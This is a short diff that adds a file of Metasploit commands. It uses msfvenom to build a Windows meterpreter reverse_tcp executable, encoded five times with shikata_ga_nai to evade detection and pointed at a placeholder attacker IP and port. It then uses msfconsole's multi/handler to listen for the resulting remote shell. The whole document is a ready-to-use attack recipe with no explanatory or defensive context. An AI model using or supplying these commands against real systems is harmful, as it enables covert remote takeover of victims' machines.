@@ -1,0 +1,9 @@
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_kali_ip> LPORT=<your_port> -e x86/shikata_ga_nai -i 5 -f exe -o payload.exe
+
+
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST <your_kali_ip>
+set LPORT <your_port>
+run
